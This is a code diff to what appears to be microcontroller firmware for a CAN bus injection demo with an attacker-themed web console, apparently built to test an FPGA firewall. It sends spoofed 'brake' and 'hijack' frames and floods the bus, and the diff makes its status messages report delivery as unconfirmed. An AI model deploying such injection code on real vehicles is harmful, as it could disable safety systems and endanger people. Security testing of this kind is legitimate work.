@@ -151,7 +151,7 @@ const char index_html[] PROGMEM = R"rawliteral(
             <h2 style="margin-top:0;">► ROOT@ATTACKER:~#</h2>
             <div id="terminal">
                 <div class="log-entry"><span class="log-time">[SYS]</span> Exploitation Framework v2.0 Initialized.</div>
-                <div class="log-entry"><span class="log-time">[SYS]</span> Connected to CAN Bus at 500kbps.</div>
+                <div class="log-entry"><span class="log-time">[SYS]</span> CAN configured for 500kbps; delivery and FPGA blocking unconfirmed.</div>
                 <div class="log-entry" style="color:#888;"><span class="log-time">[*]</span> Injecting background benign telemetry (0x123, 0x200)...</div>
             </div>
         </div>
@@ -179,13 +179,12 @@ const char index_html[] PROGMEM = R"rawliteral(
                 let res = await fetch('/api/attack?type=' + type);
                 let text = await res.text();
                 
-                if (text.includes("HARDWARE INTERCEPT")) {
-                    addLog("🚨 FATAL: Payload destroyed on the wire!", "err");
-                    addLog("🚨 ERROR: Hardware firewall (Aegis) detected.", "err");
-                } else if (text.includes("TOGGLED")) {
+                if (!res.ok) {
+                    addLog("HTTP " + res.status + ": " + text, "err");
+                } else if (text === "TOGGLED") {
                     addLog("Background telemetry stream toggled.");
                 } else {
-                    addLog("Payload delivered. Awaiting physical response...");
+                    addLog(text);
                 }
             } catch (e) {
                 addLog("Connection error to injector.", "err");
@@ -212,27 +211,27 @@ void handleAttack() {
         telemetryActive = !telemetryActive;
         response = "TOGGLED";
     } 
-    else if (type == "brake") {
-        unsigned long tStart = micros();
-        MCP2515::ERROR res = mcp2515.sendMessage(&frameBrake);
-        unsigned long tElapsed = micros() - tStart;
-
-        if (res == MCP2515::ERROR_OK) {
-            response = "SUCCESS";
-        } else {
-            response = "HARDWARE INTERCEPT DETECTED! Destroyed in " + String(tElapsed) + "us";
+    else if (type == "brake" || type == "hijack" || type == "flood") {
+        const can_frame* frame = type == "brake" ? &frameBrake :
+                                 type == "hijack" ? &frameHijack : &frameFlood;
+        unsigned int attempts = type == "flood" ? 20 : 1;
+        unsigned int submitted = 0;
+        int lastError = 0;
+        for (unsigned int i = 0; i < attempts; ++i) {
+            MCP2515::ERROR result = mcp2515.sendMessage(frame);
+            if (result == MCP2515::ERROR_OK) ++submitted;
+            else lastError = static_cast<int>(result);
+            if (type == "flood") delay(2);
         }
-    }
-    else if (type == "flood") {
-        for (int i = 0; i < 20; i++) {
-            mcp2515.sendMessage(&frameFlood);
-            delay(2);
-        }
-        response = "FLOOD_COMPLETE"; // Usually the FPGA kills most of these
-    }
-    else if (type == "hijack") {
-        mcp2515.sendMessage(&frameHijack);
-        response = "SUCCESS";
+        // ERROR_OK is a driver submission result, not an ECU receipt or FPGA report.
+        response = "TX requests: " + String(attempts) +
+                   "; driver accepted: " + String(submitted) +
+                   "; driver errors: " + String(attempts - submitted) +
+                   "; last error code: " + String(lastError) +
+                   ". Delivery and FPGA blocking are UNCONFIRMED.";
+    } else {
+        server.send(400, "text/plain", "Unknown payload type");
+        return;
     }
 
     server.send(200, "text/plain", response);
